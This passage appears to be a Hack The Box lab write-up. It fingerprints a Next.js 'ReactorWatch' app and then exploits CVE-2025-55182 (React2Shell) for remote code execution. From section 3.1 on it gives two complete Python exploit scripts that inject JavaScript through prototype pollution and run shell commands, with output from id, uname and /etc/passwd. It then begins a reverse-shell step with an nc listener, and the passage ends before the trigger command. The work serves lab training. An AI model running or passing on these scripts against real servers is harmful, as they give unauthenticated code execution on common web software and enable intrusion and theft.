#2\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:15:22\"}],[\"$\",\"span\",null,{\"className\":\"log-level warn\",\"children\":\"WARN\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Minor fluctuation detected in secondary loop pressure\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:02:18\"}],[\"$\",\"span\",null,{\"className\":\"log-level ok\",\"children\":\"OK\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Control rod position calibration successful\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"13:45:33\"}],[\"$\",\"span\",null,{\"className\":\"log-level info\",\"children\":\"INFO\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Shift change: Day crew reporting for duty\"}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"panel staff-panel\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"On-Site Personnel\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-list\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-member\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-avatar\",\"children\":\"DR\"}],[\"$\",\"div\",null,{\"className\":\"staff-info\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-name\",\"children\":\"Dr. Elena Rodriguez\"}],[\"$\",\"div\",null,{\"className\":\"staff-role\",\"children\":\"Lead Nuclear Engineer\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-status online\",\"children\":\"ONLINE\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-member\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-avatar\",\"children\":\"MK\"}],[\"$\",\"div\",null,{\"className\":\"staff-info\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-name\",\"children\":\"Marcus Kim\"}],[\"$\",\"div\",null,{\"className\":\"staff-role\",\"children\":\"Senior Technician\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-status online\",\"children\":\"ONLINE\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-member\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-avatar\",\"children\":\"JT\"}],[\"$\",\"div\",null,{\"className\":\"staff-info\",\"children\":[[\"$\",\"div\",null,{\"className\":\"staff-name\",\"children\":\"James Thompson\"}],[\"$\",\"div\",null,{\"className\":\"staff-role\",\"children\":\"Safety Officer\"}]]}],[\"$\",\"div\",null,{\"className\":\"staff-status offline\",\"children\":\"OFFLINE\"}]]}]]}]]}]]}],[\"$\",\"footer\",null,{\"className\":\"footer\",\"children\":\"REACTORWATCH™ © 2025 NUCLEAR DYNAMICS CORP. | FACILITY: SITE-7 | CLASSIFICATION: RESTRICTED\"}]]}]]}],null,[\"$\",\"$L5\",null,{\"children\":\"$L6\"}]]}],{},null]},null],[\"$\",\"$2\",\"h\",{\"children\":[null,[\"$\",\"$2\",\"odCkXeObJtnWLexaH-Dfw\",{\"children\":[[\"$\",\"$L7\",null,{\"children\":\"$L8\"}],[\"$\",\"$L9\",null,{\"children\":\"$La\"}],null]}]]}]]],\"m\":\"$undefined\",\"G\":[\"$b\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n8:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"1\",{\"children\":\"ReactorWatch | Core Monitoring System\"}],[\"$\",\"meta\",\"2\",{\"name\":\"description\",\"content\":\"Nuclear Reactor Core Monitoring Dashboard\"}]]\n"])</script><script>self.__next_f.push([1,"6:null\n"])</script></body></html>  
```

- **Build ID: `L3bimJe_3LvBcFWAnK5L4`** (extracted from `"b":"L3bimJe_3LvBcFWAnK5L4"` in the RSC payload)
<div align="center">
<br>
</div>

##### Webpack Chunk Version Grep

Search for embedded version strings in the webpack runtime chunk identified in the HTML source and the Nmap deep scan.

**Command:** `curl -s http://TARGET_IP:3000/_next/static/chunks/webpack-db0a529a99835594.js | grep -i "next"`

**Breakdown:**

- `/_next/static/chunks/webpack-db0a529a99835594.js`
    - **Description:** Next.js webpack runtime bundle
    - **Purpose:** The webpack runtime is one of the few chunks that may contain Next.js internal build metadata or version references. The filename was pulled directly from the HTML body in Method 1.
- `| grep -i "next"`
    - **Description:** Case-insensitive pipe filter
    - **Purpose:** Isolates any lines referencing "next" within the minified bundle to surface version strings without manually reading thousands of characters of minified code.

**Result:** The chunk returned only the webpack runtime bootstrapper (`webpackChunk_N_E`). Internal module wiring was present but **no version string was found**.

```bash
┌──(kali㉿kali)-[~/…/HTB/SN11/Reactor]
└─$ curl -s http://TARGET_IP:3000/_next/static/chunks/webpack-db0a529a99835594.js | grep -i "next"
(()=>{"use strict";var e={},t={};function r(o){var n=t[o];if(void 0!==n)return n.exports;var a=t[o]={exports:{}},i=!0;try{e[o](a,a.exports,r),i=!1}finally{i&&delete t[o]}return a.exports}r.m=e,(()=>{var e=[];r.O=(t,o,n,a)=>{if(o){a=a||0;for(var i=e.length;i>0&&e[i-1][2]>a;i--)e[i]=e[i-1];e[i]=[o,n,a];return}for(var u=1/0,i=0;i<e.length;i++){for(var[o,n,a]=e[i],l=!0,c=0;c<o.length;c++)(!1&a||u>=a)&&Object.keys(r.O).every(e=>r.O[e](o[c]))?o.splice(c--,1):(l=!1,a<u&&(u=a));if(l){e.splice(i--,1);var f=n();void 0!==f&&(t=f)}}return t}})(),(()=>{var e,t=Object.getPrototypeOf?e=>Object.getPrototypeOf(e):e=>e.__proto__;r.t=function(o,n){if(1&n&&(o=this(o)),8&n||"object"==typeof o&&o&&(4&n&&o.__esModule||16&n&&"function"==typeof o.then))return o;var a=Object.create(null);r.r(a);var i={};e=e||[null,t({}),t([]),t(t)];for(var u=2&n&&o;"object"==typeof u&&!~e.indexOf(u);u=t(u))Object.getOwnPropertyNames(u).forEach(e=>i[e]=()=>o[e]);return i.default=()=>o,r.d(a,i),a}})(),r.d=(e,t)=>{for(var o in t)r.o(t,o)&&!r.o(e,o)&&Object.defineProperty(e,o,{enumerable:!0,get:t[o]})},r.f={},r.e=e=>Promise.all(Object.keys(r.f).reduce((t,o)=>(r.f[o](e,t),t),[])),r.u=e=>{},r.miniCssF=e=>{},r.g=function(){if("object"==typeof globalThis)return globalThis;try{return this||Function("return this")()}catch(e){if("object"==typeof window)return window}}(),r.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),(()=>{var e={},t="_N_E:";r.l=(o,n,a,i)=>{if(e[o]){e[o].push(n);return}if(void 0!==a)for(var u,l,c=document.getElementsByTagName("script"),f=0;f<c.length;f++){var s=c[f];if(s.getAttribute("src")==o||s.getAttribute("data-webpack")==t+a){u=s;break}}u||(l=!0,(u=document.createElement("script")).charset="utf-8",u.timeout=120,r.nc&&u.setAttribute("nonce",r.nc),u.setAttribute("data-webpack",t+a),u.src=r.tu(o)),e[o]=[n];var d=(t,r)=>{u.onerror=u.onload=null,clearTimeout(p);var n=e[o];if(delete e[o],u.parentNode&&u.parentNode.removeChild(u),n&&n.forEach(e=>e(r)),t)return t(r)},p=setTimeout(d.bind(null,void 0,{type:"timeout",target:u}),12e4);u.onerror=d.bind(null,u.onerror),u.onload=d.bind(null,u.onload),l&&document.head.appendChild(u)}})(),r.r=e=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},(()=>{var e;r.tt=()=>(void 0===e&&(e={createScriptURL:e=>e},"undefined"!=typeof trustedTypes&&trustedTypes.createPolicy&&(e=trustedTypes.createPolicy("nextjs#bundler",e))),e)})(),r.tu=e=>r.tt().createScriptURL(e),r.p="/_next/",(()=>{var e={68:0,533:0};r.f.j=(t,o)=>{var n=r.o(e,t)?e[t]:void 0;if(0!==n){if(n)o.push(n[2]);else if(/^(533|68)$/.test(t))e[t]=0;else{var a=new Promise((r,o)=>n=e[t]=[r,o]);o.push(n[2]=a);var i=r.p+r.u(t),u=Error();r.l(i,o=>{if(r.o(e,t)&&(0!==(n=e[t])&&(e[t]=void 0),n)){var a=o&&("load"===o.type?"missing":o.type),i=o&&o.target&&o.target.src;u.message="Loading chunk "+t+" failed.\n("+a+": "+i+")",u.name="ChunkLoadError",u.type=a,u.request=i,n[1](u)}},"chunk-"+t,t)}}},r.O.j=t=>0===e[t];var t=(t,o)=>{var n,a,[i,u,l]=o,c=0;if(i.some(t=>0!==e[t])){for(n in u)r.o(u,n)&&(r.m[n]=u[n]);if(l)var f=l(r)}for(t&&t(o);c<i.length;c++)a=i[c],r.o(e,a)&&e[a]&&e[a][0](),e[a]=0;return r.O(f)},o=self.webpackChunk_N_E=self.webpackChunk_N_E||[];o.forEach(t.bind(null,0)),o.push=t.bind(null,o.push.bind(o))})()})();
```
<div align="center">
<br>
</div>

##### Burp Suite Intercept

Inspected captured responses under **Proxy → HTTP History → Inspector → Response Headers** using the Burp browser.

**Result:** The Inspector panel confirmed the same 12 response headers captured by curl — `X-Powered-By: Next.js` without a version suffix. No additional headers were disclosed beyond what the HEAD request had already captured.

![[Pasted image 20260601120139.png]]
<div align="center">
<br>
</div>

##### Wappalyzer & WhatWeb

![[Pasted image 20260601143917.png]]

```shell
┌──(kali㉿kali)-[~/…/HTB/SN11/Reactor/demo-app]
└─$ whatweb -a 3 http://TARGET_IP:3000/        
http://TARGET_IP:3000/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[TARGET_IP], Script, Title[ReactorWatch | Core Monitoring System], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js]
```
<div align="center">
<br>
</div>

##### Directory Fuzzing of `/_next/`

With passive methods exhausted, direct requests were issued to paths that commonly expose version metadata in misconfigured deployments.

Standard web root fuzzing would miss Next.js-specific paths. The fuzz was anchored directly inside `/_next/` to maximise signal against the framework's own directory tree.

**Command:** `ffuf -u http://TARGET_IP:3000/_next/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -t 50`

**Result:** Zero hits across all 29,999 entries. The `/_next/` directory tree returned no discoverable paths via standard wordlist fuzzing.
<div align="center">
<br>
</div>

##### Build Manifest

With all standard channels returning no version data, the attack pivoted to leveraging artefacts already in hand. The path to the build manifest was not guesswork — it was derived through a direct chain of evidence:

```
Nmap deep-dive scan (Section 2.1.2)
    → Raw HTTP response body embedded in scan output
        → Revealed: /_next/static/chunks/webpack-db0a529a99835594.js
            → curl body fetch confirmed App Router
                → RSC payload contained "b":"L3bimJe_3LvBcFWAnK5L4"
                    → Build ID extracted
                        → Known Next.js convention:
                          /_next/static/[BUILD_ID]/_buildManifest.js
                              → /_next/static/L3bimJe_3LvBcFWAnK5L4/_buildManifest.js
```

The build manifest is **always publicly accessible by design** — the browser requires it to handle client-side navigation. Its location is a hardcoded Next.js convention that never changes across versions.

To understand this anatomy, a local Next.js demo application was spun up to observe the build structure firsthand.
<div align="center">
<br>
</div>

##### Local Demo — Next.js Project Anatomy

To validate the build manifest discovery chain and understand the filesystem layout of a real Next.js deployment, a fresh application was created locally using `create-next-app`.

**Command:** `npx create-next-app@latest demo-app`

**Breakdown:**

- `npx`
    - **Description:** Node.js package executor
    - **Purpose:** Downloads and executes `create-next-app` without requiring a global install — always pulls the latest version.
- `create-next-app@latest`
    - **Description:** Official Next.js project scaffolding tool
    - **Purpose:** Bootstraps a complete Next.js project with all dependencies, config files, and directory structure. The `@latest` tag ensures the most current version is installed, which also disclosed the **current latest version: 16.2.6**.
- `demo-app`
    - **Description:** Output directory name
    - **Purpose:** The local directory where the scaffolded project is created.

**Result:** Next.js **16.2.6** installed. Project scaffolded successfully with the following structure:

```
demo-app/
├── app/                  ← App Router source directory
├── public/               ← Static assets
├── node_modules/         ← Installed dependencies
├── package.json          ← Dependency manifest (contains "next": "16.2.6")
├── next.config.ts        ← Next.js configuration
├── tsconfig.json         ← TypeScript configuration
└── .next/                ← Build output (generated after npm run build)
```

**Command:** `npm run build`

**Breakdown:**

- `npm run build`
    - **Description:** Executes the `build` script defined in `package.json`
    - **Purpose:** Triggers `next build`, compiling the application into an optimised production build and populating the `.next/` directory — the server-side equivalent of what is running on the target.

**Result:** Build completed successfully under Next.js 16.2.6. The `.next/` output directory revealed the full build anatomy:

```bash
.next/
├── BUILD_ID                    ← Plain text file containing the build ID
├── build-manifest.json         ← Server-side route-to-chunk mapping
├── static/
│   ├── chunks/                 ← JavaScript bundles served at /_next/static/chunks/
│   └── kKi5Ufijs43No6TsFekSv/ ← Build ID as directory name
│       ├── _buildManifest.js   ← Publicly accessible client manifest
│       ├── _ssgManifest.js     ← Static generation manifest
│       └── _clientMiddlewareManifest.js
└── server/                     ← Server-only build output (not web-accessible)
```

**Key finding — `BUILD_ID` confirmed as plain text:**

```shell
$ cat .next/BUILD_ID
kKi5Ufijs43No6TsFekSv
```

```shell
$ cat .next/static/kKi5Ufijs43No6TsFekSv/_buildManifest.js
self.__BUILD_MANIFEST = {
  "__rewrites": {
    "afterFiles": [],
    "beforeFiles": [],
    "fallback": []
  },
  "sortedPages": [
    "/_app",
    "/_error"
  ]
};self.__BUILD_MANIFEST_CB && self.__BUILD_MANIFEST_CB()  
```

This directly validates the extraction of `L3bimJe_3LvBcFWAnK5L4` from the target's RSC payload — both are build IDs stored in identical plain text format, confirming the discovery chain.

**Key finding — `_buildManifest.js` structure confirmed:**

```js
((self.__BUILD_MANIFEST = (function (e, r, t) {
  return {
    __rewrites: { afterFiles: [], beforeFiles: [], fallback: [] },
    __routerFilterStatic: {
      numItems: 2,
      errorRate: 1e-4,
      numBits: 39,
      numHashes: 14,
      bitArray: [
        0,
        1,
        1,
        0,
        0,
        1,
        e,
        r,
        r,
        e,
        e,
        r,
        e,
        e,
        e,
        r,
        r,
        e,
        e,
        e,
        e,
        r,
        e,
        r,
        r,
        r,
        r,
        e,
        e,
        e,
        r,
        e,
        r,
        e,
        r,
        e,
        e,
        e,
        r,
      ],
    },
    __routerFilterDynamic: {
      numItems: r,
      errorRate: 1e-4,
      numBits: r,
      numHashes: null,
      bitArray: [],
    },
    "/_error": ["static/chunks/pages/_error-9b7125ad1a1e68fa.js"],
    sortedPages: ["/_app", "/_error"],
  };
})(1, 0, 0)),
  self.__BUILD_MANIFEST_CB && self.__BUILD_MANIFEST_CB());

```

The local demo running produced an **identical `_buildManifest.js` structure** to what the target returned — same `sortedPages` array, same `__rewrites` skeleton. This structural match strongly suggests the target is running a **version in the same generation** as 16.x.
<div align="center">
<br>
<br>
</div>

#### 2.2.2 Vulnerability Research & Analysis

**Search Query:** `next js cves`

![[65a917cc-7c8c-4b23-844f-85ccec30cfcb.png]]

The Google AI Overview returned the most significant Next.js CVEs organised by severity. Two entries were immediately relevant to the target profile:

##### CVE-2025-55182 / CVE-2025-66478 — React2Shell / React4Shell

| Field             | Detail                                                 |
| ----------------- | ------------------------------------------------------ |
| CVSS Score        | 10.0 (Critical)                                        |
| Impact            | Unauthenticated Remote Code Execution (RCE)            |
| Affected Versions | Next.js 15.x and 16.x using the App Router             |
| Patched Versions  | 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7 |
This vulnerability stems from unsafe deserialization in the React Server Components (RSC) Flight protocol. An attacker can send a single crafted HTTP request to execute arbitrary code on the server with no authentication required. CVE-2025-66478 is the Next.js-specific tracking number but has since been marked a duplicate of the upstream CVE-2025-55182.

This CVE is the **primary candidate** for the following reasons, all derived from evidence collected during fingerprinting:

- `self.__next_f` RSC payload blocks in the HTML body confirm **React Server Components are active** — the exact attack surface this CVE targets.
- The `x-nextjs-prerender` and `x-nextjs-stale-time` headers confirm **App Router** — a prerequisite for vulnerability.
- The webpack chunk `Last-Modified: 28 Dec 2025` places the build **25 days after the December 3 disclosure** — well within a realistic unpatched window.
- The local demo anatomy matched Next.js **16.x** structure, which falls directly inside the affected version range.
- The application has **no authentication layer** — making an unauthenticated RCE CVE a perfect fit, as there is nothing else to bypass first.
- Default `create-next-app` deployments are vulnerable with zero developer code changes required — the REACTORWATCH app shows no signs of custom hardening.
<div align="center">
<br>
<br>
</div>

Next.js Server Actions use the React Flight protocol to serialize/deserialize data between client and server. When a POST request is sent with a `Next-Action` header, the server deserializes a multipart form body as a React Flight encoded payload.

The vulnerability exploits prototype pollution in the React Flight decoder. By crafting a malicious payload where:

1. A fake "thenable" object is injected with `"then": "$1:__proto__:then"` — polluting `Object.prototype.then` to point to a reference path that resolves to the `_formData.get` function
2. The `_response._formData.get` is set to `"$1:constructor:constructor"` — resolving to `Function.constructor` (the `Function` constructor itself)
3. The `_response._prefix` contains arbitrary JavaScript code injected as the function body

When the Flight decoder processes this payload, it:
1. Resolves `$1:__proto__:then` → ends up calling `Function.constructor` with `_prefix` as the argument
2. This constructs and executes the arbitrary JS code in `_prefix`
3. The crafted code calls `process.mainModule.require('child_process').execSync()` for OS command execution

**Exploit payload structure:**
```json
{
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\": \"$B0\"}",
    "_response": {
        "_prefix": "<ARBITRARY_JS_CODE>",
        "_formData": {"get": "$1:constructor:constructor"}
    }
}
```

**Output exfiltration:** The output is thrown as an `Error` with a custom `digest` field, which Next.js returns in the response body as `1:E{"digest":"<OUTPUT>"}`.
<div align="center">
<br>
</div>

##### Understanding React Server Components and Why It Matters Here

![[rsc_normal_flow 1.png]]

###### The Normal Way Websites Work

When you visit most websites, the server sends your browser two things: the raw HTML to display the page, and JavaScript files that make it interactive. Your browser runs all that JavaScript locally — the server's job is basically just file delivery.

###### What RSC Changes

React Server Components changes where the work happens. Instead of sending your browser all the code and letting it figure things out, the server runs certain parts of the application itself and sends the browser a **pre-packaged description** of the result — almost like sending a flat-pack furniture instruction sheet instead of the raw materials. The browser just follows the instructions.

To send this description, the server encodes it into a specific format and streams it to the browser over HTTP. That format is called the **Flight protocol**. Think of it as a specialised data language the server and browser use to talk to each other about what the page should look like.

###### Where The Vulnerability Lives

Here's the problem. When data arrives from outside — from the internet, from a user's browser — you have to **unpack it** before you can use it. That unpacking process is called deserialization.

Deserialization is historically one of the most dangerous operations in software. If the unpacking process isn't strict enough about what it accepts, an attacker can craft a malicious package that, when unpacked, causes the server to execute code it was never supposed to run.

CVE-2025-55182 is exactly that — the Flight protocol unpacking process on the server didn't validate what it was receiving carefully enough. Send it a crafted HTTP request with a malicious payload, and the server executes your code. No login required. No special access. Just one HTTP request.
<div align="center">
<br>
<br>
</div>

##### How We Confirmed RSC Was Running on the Target

This isn't an assumption — four separate pieces of evidence collected during fingerprinting all independently confirmed it.

###### `self.__next_f` in the page source

When the HTML body was fetched with curl, it contained this:

```javascript
self.__next_f=self.__next_f||[]).push([0])
self.__next_f.push([1,"2:\"$Sreact.fragment\"..."])
```

`__next_f` is the browser-side bucket that collects the incoming Flight stream from the server. It is only ever present when the server is actively using RSC. A standard website or a non-RSC Next.js app would never have this variable. Seeing it in the page source is the equivalent of seeing steam coming out of a pipe — you know something is running underneath.

###### The `Vary: RSC` response header

The HEAD request returned:

```http
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
```

The `Vary` header is the server's way of saying "my response changes depending on these request headers." `RSC` appearing here means the server is actively watching for RSC-specific requests and handling them differently. A server that wasn't using RSC would have no reason to list it here.

###### The Flight payload content itself

Inside the `__next_f` stream, the actual data looked like this:

```
"3:I[5244,[],""]"
"4:I[3866,[],""]"
```

The `I[...]` notation is the Flight protocol's own encoding format for referencing server-side modules. This isn't generic JavaScript — it's the literal serialized output of the RSC engine running on the server, being transmitted live. Seeing this in the response means the deserialization pipeline that CVE-2025-55182 targets is actively processing data.

###### `x-nextjs-prerender: 1`

This header signals a feature called Partial Pre-Rendering, which is only available in applications already using RSC. It cannot exist on a non-RSC application — its presence alone rules out any setup where RSC might not be active.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation — Initial Access

### 3.1 Exploit Acquisition and Preparation

The next objective was sourcing a reliable proof-of-concept that could deliver code execution against the confirmed target.

The next objective was sourcing a reliable proof-of-concept that could deliver code execution against the confirmed target. [Assetnote's react2shell-scanner](https://github.com/assetnote/react2shell-scanner) had already validated exploitability, but as established in Section 3.1, it is a detection-only tool with no facility for payload delivery. A separate exploit was required.

```shell   
┌──(kali㉿kali)-[~/…/HTB/SN11/Reactor/react2shell-scanner]
└─$ python3 scanner.py -u http://TARGET_IP:3000/ --safe-check

brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using safe side-channel check
[!] SSL verification disabled

[VULNERABLE] http://TARGET_IP:3000/ - Status: 500

============================================================
SCAN SUMMARY
============================================================
  Total hosts scanned: 1
  Vulnerable: 1
  Not vulnerable: 0
  Errors: 0
============================================================
```

The PoC published by msanft at https://github.com/msanft/CVE-2025-55182 was selected. 
<div align="center">
<br>
<br>
</div>

##### POC Code:

```python
# poc.py
import requests, json, re, base64, sys

BASE_URL = "http://10.129.13.245:3000/"
CMD = sys.argv[1]

b64_cmd = base64.b64encode(CMD.encode()).decode()
js_prefix = f"""
var cmd = Buffer.from('{b64_cmd}', 'base64').toString();
var res = process.mainModule.require('child_process').execSync(cmd, {{timeout:5000}}).toString().trim();
throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});
"""

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": js_prefix.strip(),
        "_formData": {"get": "$1:constructor:constructor"},
    },
}

files = {"0": (None, json.dumps(crafted_chunk)), "1": (None, '"$@0"')}
headers = {"Next-Action": "x"}
response = requests.post(BASE_URL, files=files, headers=headers)

print(response.text)
```

```python
# rce.py
import requests, sys, json, re, base64

BASE_URL = "http://10.129.13.245:3000/"
CMD = sys.argv[1]

# Encode the command as base64
b64_cmd = base64.b64encode(CMD.encode()).decode()

# Build the JS code directly - using Buffer and execSync with args array
js_prefix = f"""
var cmd = Buffer.from('{b64_cmd}', 'base64').toString();
var res = process.mainModule.require('child_process').execSync(cmd, {{timeout:5000}}).toString().trim();
throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});
"""

# Remove newlines to fit in the prefix field
js_prefix = js_prefix.replace('\n', ' ').strip()

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": js_prefix,
        "_formData": {"get": "$1:constructor:constructor"},
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"')
}

headers = {"Next-Action": "x"}

response = requests.post(BASE_URL, files=files, headers=headers)

body = response.text
m = re.search(r'1:E\{"digest":"(.*?)"\}', body, re.DOTALL)
if m:
    raw = m.group(1)
    try:
        decoded = json.loads('"' + raw + '"')
    except:
        decoded = raw.replace('\\n', '\n').replace('\\t', '\t')
    print(decoded)
else:
    print(f"[Error] No output. Status: {response.status_code}")
    print(body[:300])

```

The key difference between the two scripts comes down to one thing — **where the output goes**. Both send the exact same payload. But `poc.py` throws the raw server response at you and you have to find the output yourself buried in the JSON. `rce.py` adds the regex `1:E\{"digest":"(.*?)"\}` which hunts through that response body and pulls the command result out cleanly. That's literally the only functional difference between them.

The prototype pollution step in the second diagram is the heart of the CVE — by referencing `$1:__proto__:then` inside what looks like a valid Flight object, the script corrupts JavaScript's inheritance chain on the server. Once that's corrupted, the `_prefix` field gets executed as code rather than treated as data, and from that point on it's just standard Node.js shell execution.

![[cve_2025_55182_exploit_chain 1.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Initial Enumeration via RCE

With the exploit in hand, execution context was established before attempting anything destructive. All commands were run through `rce.py` to read output cleanly without requiring a listener.
<div align="center">
<br>
</div>

#### 3.2.1 Confirming Execution Context

**Command:** `python3 poc.py "id"`

**Breakdown:**

- `poc.py`
    - **Description:** CVE-2025-55182 exploit script
    - **Purpose:** Delivers the crafted Flight protocol payload to the target and returns command output via the `digest` exfiltration channel.
- `"id"`
    - **Description:** Unix identity command
    - **Purpose:** Confirms which OS user the Node.js process is running as — the most important first check after gaining RCE.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 poc.py "id"                        
uid=999(node) gid=988(node) groups=988(node)
```

The application was running as `uid=999(node)` — a low-privilege service account, consistent with a containerized Node.js deployment. Output was returned cleanly via the `digest` field, confirming the exfiltration path was fully operational.
<div align="center">
<br>
</div>

#### 3.2.2 System and File Enumeration

With execution context confirmed, further enumeration commands were run to map the target environment.

**Command:** `python3 rce.py "uname -a"`

**Breakdown:**

- `uname -a`
    - **Description:** Full system information command
    - **Purpose:** Reveals the kernel version, architecture, and OS — critical for identifying potential kernel exploits and understanding the target environment.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 rce.py "uname -a"
Linux reactor 6.8.0-117-generic #117-Ubuntu SMP PREEMPT_DYNAMIC Tue May  5 19:26:24 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
```

**Command:** `python3 rce.py "cat /etc/passwd"`

**Breakdown:**

- `cat /etc/passwd`
    - **Description:** Reads the system user account file
    - **Purpose:** Reveals all local user accounts, their home directories, and shells — identifies human accounts worth targeting for lateral movement.

**Result:** Full passwd file returned. Two accounts of immediate interest were identified:

| Username   | UID  | Home             | Shell               | Significance                                           |
| ---------- | ---- | ---------------- | ------------------- | ------------------------------------------------------ |
| `root`     | 0    | `/root`          | `/bin/bash`         | Ultimate privilege target                              |
| `engineer` | 1000 | `/home/engineer` | `/bin/bash`         | Human account — interactive login shell, SSH candidate |
| `node`     | 999  | `/home/node`     | `/usr/sbin/nologin` | Current execution context — no interactive shell       |

```
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 rce.py "cat /etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
engineer:x:1000:1000:engineer:/home/engineer:/bin/bash
node:x:999:988::/home/node:/usr/sbin/nologin
_laurel:x:996:987::/var/log/laurel:/bin/false
```

**Command:** `python3 rce.py "ls"`

**Result:**

```
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 rce.py "pwd"                 
/opt/reactor-app

┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ python3 rce.py "ls" 
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

**Key finding:** `reactor.db` — a SQLite database present in the application root. Database files in web application directories frequently contain credentials.
<div align="center">
<br>
<br>
</div>

### Reverse Shell

You can also use `poc.py` but you'd have to:

1. Set up your listener

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ nc -lvnp 4444
```

2. Trigger the reverse shell via the exploit:

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
